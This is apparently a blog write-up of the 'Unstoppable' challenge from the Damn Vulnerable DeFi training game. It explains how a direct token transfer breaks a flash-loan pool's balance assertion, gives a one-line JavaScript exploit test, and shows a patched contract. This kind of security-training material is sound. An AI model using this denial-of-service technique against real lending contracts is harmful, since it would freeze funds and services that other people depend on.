---
layout: post
title: Damn Vulnerable DeFi - Unstoppable
---

## Description
There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

If only there was a way to attack and stop the pool from offering flash loans ...

You start with 100 DVT tokens in balance.

## Solution
One exploit strategy is to see which invariants a contract enforces and then
try to break those invariants.

The key error in _UnstoppableLender_ is this assertion

```
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

As we'll see, this equality is not an invariant after all...

The assertion would hold if `depositTokens` was the **only** way to transfer tokens to the contract,
but it's not. We can simply transfer tokens directly from the attacker to the contract and with the
ERC20 `transfer` function and bypass `depositTokens` altogether. This causes `balanceBefore` to be greater
than `poolBalance`, breaking the assertion for all future calls to `flashLoan`.

This exploit doesn't require a contract. We can do it direclty in Javascript
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    // Directly transfer DamnValuableToken to the Lender and bypass depositTokens
    // This will break the poolBalance == balanceBefore assertion
    await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
});
```

## Patched Contract
`poolBalance` is a redundant variable. To patch this contract
we remove `poolBalance` and track the balance with ERC20 `balanceOf` instead.

```
contract UnstoppableLenderV2 is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

You can verify yourself that the exploit no longer works with `UnstoppableLenderV2`!